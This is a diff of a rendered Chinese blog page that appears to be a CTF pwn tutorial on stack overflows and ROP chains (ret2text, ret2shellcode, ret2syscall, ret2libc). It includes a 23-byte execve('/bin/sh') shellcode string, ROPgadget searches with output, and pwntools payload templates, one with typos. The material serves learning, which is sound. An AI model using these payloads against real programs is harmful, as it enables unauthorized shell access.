@@ -16,12 +16,12 @@
   <meta name="author" content="梓曰">
   <meta name="keywords" content="">
   
-    <meta name="description" content="查找对应溢出一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址 可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过gdb调试观察EIP寄存器处的 4 位字符，通过指令cyclic -l 对应EIP的4位字符，得到需要填充的溢出字符长度。 保护模式NX：防止栈上执行 (需要利用到 bss 段) Canary：检测是否发生栈溢出  Ret2t">
+    <meta name="description" content="查找对应溢出 一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址 可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过gdb调试观察EIP寄存器处的 4 位字符，通过指令cyclic -l 对应EIP的4位字符，得到需要填充的溢出字符长度。 保护模式 NX：防止栈上执行 (需要利用到 bss 段) Canary：检测是否发生栈溢出 Ret2">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PWN的基本ROP链构造">
 <meta property="og:url" content="https://equinox-shame.github.io/2022/03/14/PWN%E7%9A%84%E5%9F%BA%E6%9C%ACROP%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
 <meta property="og:site_name" content="Autumnal">
-<meta property="og:description" content="查找对应溢出一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址 可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过gdb调试观察EIP寄存器处的 4 位字符，通过指令cyclic -l 对应EIP的4位字符，得到需要填充的溢出字符长度。 保护模式NX：防止栈上执行 (需要利用到 bss 段) Canary：检测是否发生栈溢出  Ret2t">
+<meta property="og:description" content="查找对应溢出 一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址 可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过gdb调试观察EIP寄存器处的 4 位字符，通过指令cyclic -l 对应EIP的4位字符，得到需要填充的溢出字符长度。 保护模式 NX：防止栈上执行 (需要利用到 bss 段) Canary：检测是否发生栈溢出 Ret2">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-03-14T05:16:18.687Z">
 <meta property="article:modified_time" content="2022-03-06T06:51:24.291Z">
@@ -278,45 +278,51 @@
             
               <div class="markdown-body">
                 
-                <h2 id="查找对应溢出"><a href="#查找对应溢出" class="headerlink" title="查找对应溢出"></a>查找对应溢出</h2><p>一般的溢出内容是<code>EIP</code>，因为<code>EIP</code>寄存器存储着我们<code>CPU</code>要读取指令的地址</p>
+                <h2 id="查找对应溢出">查找对应溢出</h2>
+<p>一般的溢出内容是<code>EIP</code>，因为<code>EIP</code>寄存器存储着我们<code>CPU</code>要读取指令的地址</p>
 <p>可以通过 <code>cyclic 数字</code>这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过<code>gdb</code>调试观察EIP寄存器处的 4 位字符，通过指令<code>cyclic -l 对应EIP的4位字符</code>，得到需要填充的溢出字符长度。</p>
-<h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>NX：防止栈上执行 (需要利用到 bss 段)</p>
-<p>Canary：检测是否发生栈溢出 </p>
-<h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><p>通过计算溢出点的地址到对应返回的栈顶（ebp）的距离来进行溢出，同时要加上对应 ret 所占的 4 个字节。</p>
+<h2 id="保护模式">保护模式</h2>
+<p>NX：防止栈上执行 (需要利用到 bss 段)</p>
+<p>Canary：检测是否发生栈溢出</p>
+<h2 id="Ret2text">Ret2text</h2>
+<p>通过计算溢出点的地址到对应返回的栈顶（ebp）的距离来进行溢出，同时要加上对应 ret 所占的 4 个字节。</p>
 <p><strong>对应 exp 构造模式：</strong></p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">shellcode</span> = 对应 /bin/sh/ 地址 <br><span class="hljs-attr">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span>*[溢出点到栈顶距离] + <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span> + p32/p64(shellcode)<br></code></pre></td></tr></table></figure>
-
-<h2 id="Ret2shellcode"><a href="#Ret2shellcode" class="headerlink" title="Ret2shellcode"></a>Ret2shellcode</h2><p>程序中没有出现 /bin/sh/ 地址需要自己构造，构造方式有两种：</p>
+<h2 id="Ret2shellcode">Ret2shellcode</h2>
+<p>程序中没有出现 /bin/sh/ 地址需要自己构造，构造方式有两种：</p>
 <ul>
-<li><p>23字节</p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">shellcode = &quot;<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05&quot;<br></code></pre></td></tr></table></figure></li>
-<li><p>44字节</p>
-<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>shellcode = <span class="hljs-keyword">asm</span>(shellcraft.sh())<br></code></pre></td></tr></table></figure></li>
+<li>
+<p>23字节</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">shellcode = &quot;<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>05&quot;<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>44字节</p>
+<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>shellcode = <span class="hljs-keyword">asm</span>(shellcraft.sh())<br></code></pre></td></tr></table></figure>
+</li>
 </ul>
 <p>一般实现溢出方式类似于 ret2text ，不同的是需要使用 <code>vmmap</code>检查对应的权限，同时也需要观察<code>bss</code><strong>（检查溢出点是否定义在 bss 段上）</strong></p>
 <p><strong>对应 exp 构造模式：</strong></p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">bss</span> = bss对应的地址<br><span class="hljs-attr">shellcode</span> = 构造一个shell<br><span class="hljs-attr">payload</span> = shellcode.ljust(<span class="hljs-string">&#x27;a&#x27;</span>,溢出长度) + p32/p64(bss)<br></code></pre></td></tr></table></figure>
-
-<h2 id="Ret2syscall"><a href="#Ret2syscall" class="headerlink" title="Ret2syscall"></a>Ret2syscall</h2><p>程序中同样没有出现 /bin/sh/ 地址需要自己构造，原理为把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用（知识点<code>Linux</code>下系统调用）。</p>
+<h2 id="Ret2syscall">Ret2syscall</h2>
+<p>程序中同样没有出现 /bin/sh/ 地址需要自己构造，原理为把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用（知识点<code>Linux</code>下系统调用）。</p>
 <p>学习链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/234228.html">ret2syscall原理详解与实例分析 </a></p>
 <p><strong>Syscall 调用规范</strong> <code>execve(“/bin/sh”, 0,0)</code></p>
 <p>它对应的汇编代码为：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span># 系统调用号载入， execve为<span class="hljs-number">0xb</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span># 第一个参数， /bin/sh的string<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ecx</span># 第二个参数，<span class="hljs-number">0</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">edx</span># 第三个参数，<span class="hljs-number">0</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure>
-
 <p>寻找对应可以利用的 <code>ret(gadgets)</code>可以使用 <code>ropgadgets</code> 这个工具</p>
 <p>对应寻找步骤：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ROPgadget --binary 对应文件  --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span>  //search eax  <br>0x080bb196 : pop eax ; ret<br>------------------------------------------------------------------------------------------------------------------<br>$ ROPgadget --binary 对应文件  --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;ebx&#x27;</span>  //search ebx\edx\ecx<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>------------------------------------------------------------------------------------------------------------------<br><span class="hljs-variable">$ROPgadget</span> --binary 对应文件  --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span>   //search <span class="hljs-string">&#x27;bin/sh&#x27;</span><br>   Strings information<br>   ============================================================<br>   0x080be408 : /bin/sh<br> ----------------------------------------------------------------------------------------------------------------- <br><span class="hljs-variable">$ROPgadget</span> --binary 对应文件  --only <span class="hljs-string">&#x27;int&#x27;</span>       // search int 0x80         <br>   Gadgets information<br>   ============================================================<br>   0x08049421 : int 0x80<br></code></pre></td></tr></table></figure>
-
 <p><strong>对应 exp 构造模式：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pop_eax_ret = 可利用的 eax 的地址<br>pop_edx_ecx_ebx_ret = 可利用的 ebx、edx、ecx地址<br>int_0x80 = <span class="hljs-built_in">int</span> <span class="hljs-number">0x80</span> 的地址<br>binsh = <span class="hljs-string">&#x27;bin/sh&#x27;</span> 的地址<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * 溢出长度, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>io.sendline(payload)<br></code></pre></td></tr></table></figure>
-
-<h2 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h2><p><code>ret2libc</code> 即控制函数的执行 <code>libc (Linux下C库)</code> 中的函数，通常是返回至某个函数的 <code>PLT</code> 处或者函数的具体位置 ( 即函数对应的 got 表项的内容 )。一般情况下，我们会选择执行 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+<h2 id="Ret2libc">Ret2libc</h2>
+<p><code>ret2libc</code> 即控制函数的执行 <code>libc (Linux下C库)</code> 中的函数，通常是返回至某个函数的 <code>PLT</code> 处或者函数的具体位置 ( 即函数对应的 got 表项的内容 )。一般情况下，我们会选择执行 <code>system(&quot;/bin/sh&quot;)</code>。</p>
 <p>学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解</a></p>
-<h3 id="含有-system-和-bin-sh"><a href="#含有-system-和-bin-sh" class="headerlink" title="含有 system 和 /bin/sh"></a>含有 system 和 /bin/sh</h3><p><strong>一般函数中含有 <code>/bin/sh</code> 、<code>system</code> 函数时构造对应的 exp 构建模式为：</strong></p>
+<h3 id="含有-system-和-bin-sh">含有 system 和 /bin/sh</h3>
+<p><strong>一般函数中含有 <code>/bin/sh</code> 、<code>system</code> 函数时构造对应的 exp 构建模式为：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">binsh_addr = /<span class="hljs-built_in">bin</span>/sh/ 的地址<br>system_plt = system 函数的地址<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度, system_plt,<span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>,binsh_addr])<br></code></pre></td></tr></table></figure>
-
 <p>需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
-<h3 id="不含有-bin-sh"><a href="#不含有-bin-sh" class="headerlink" title="不含有 /bin/sh"></a>不含有 /bin/sh</h3><p>如果函数中不含有 <code>/bin/sh</code> 时，我们需要在<code>bss</code>段上自己构建一个<code>/bin/sh</code></p>
+<h3 id="不含有-bin-sh">不含有 /bin/sh</h3>
+<p>如果函数中不含有 <code>/bin/sh</code> 时，我们需要在<code>bss</code>段上自己构建一个<code>/bin/sh</code></p>
 <p><strong>此时 exp 构造模式为：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">system_plt = system 函数地址<br>gets_addr = 溢出点函数地址<br>buf_addr = bss 段上变量地址<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度,gets_addr,system_plt,buf_addr,buf_addr])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure>
 <blockquote>
@@ -331,10 +337,8 @@
 <p>或者：</p>
 <p>寻找一个 pop：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">ROPgadget --binary ret2libc2 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span>| grep <span class="hljs-string">&#x27;ebx&#x27;</span><br>0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804843d : pop ebx ; ret<br></code></pre></td></tr></table></figure>
-
 <p><strong>之后的 exp 构造模式：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">system_plt = system 函数地址<br>pop_ebx = ret ebx 的地址<br>gets_addr = 溢出点函数地址<br>buf_addr = bss 段上变量地址<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度,gets_addr,pop_ebx,system_plt,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span>,buf_addr])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure>
-
 <blockquote>
 <p>对应的栈分布为：</p>
 <ul>
@@ -342,18 +346,17 @@
 <li>pop ebx ；ret地址</li>
 <li>buf2（gets的参数）</li>
 <li>system地址</li>
-<li>system的返回地址（’AAAA’）</li>
+<li>system的返回地址（‘AAAA’）</li>
 <li>buf2（system的参数）</li>
 </ul>
 </blockquote>
 <p>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system。</p>
-<h3 id="不含有-System-和-bin-sh"><a href="#不含有-System-和-bin-sh" class="headerlink" title="不含有 System 和 /bin/sh"></a>不含有 System 和 /bin/sh</h3><p>两个都没有给出的话需要自己寻找对应版本的 <code>libc</code></p>
+<h3 id="不含有-System-和-bin-sh">不含有 System 和 /bin/sh</h3>
+<p>两个都没有给出的话需要自己寻找对应版本的 <code>libc</code></p>
 <p><strong>泄露函数地址：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=process(<span class="hljs-string">&#x27;./&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * 溢出长度 + p32(puts_plt) + p32(main) +p32(libc_start_main_go)<br><span class="hljs-comment"># io.recvuntil(&#x27;&#x27;)</span><br>io.sendline(payload1)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])     <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;addr:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_start_main_addr))<br></code></pre></td></tr></table></figure>
-
 <p><strong>对应构造 exp 模式为：</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">system_addr = 找到对应 libc 版本后 system 的地址<br>binsh_addr = 找到对饮 libc版本后 /<span class="hljs-built_in">bin</span>/sh 的地址<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * 溢出长度(需要用 cyclic 重新测试), system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr]) <span class="hljs-comment"># 0xdeadbeef 为 system 地址返回，可以随意设置</span><br>sh.sendline(payload)<br></code></pre></td></tr></table></figure>
-
 <p>一共需要两次 exp的编写，便可以完成对没有<code>/bin/sh</code>与<code>system</code>的<code>ret2libc</code>题目</p>
 
                 
@@ -448,8 +451,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/03/14/RARPasswordRecovery%20%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" title="RARPasswordRecovery 逆向分析">
-                        <span class="hidden-mobile">RARPasswordRecovery 逆向分析</span>
+                      <a href="/2022/03/14/Re%E6%A8%A1%E5%9D%97/" title="Re模块">
+                        <span class="hidden-mobile">Re模块</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -531,6 +534,12 @@
 
 
   
+
+
+  
+  
+
+
 
 
 
@@ -749,6 +758,49 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
 
   <script defer src="/js/leancloud.js" ></script>
 
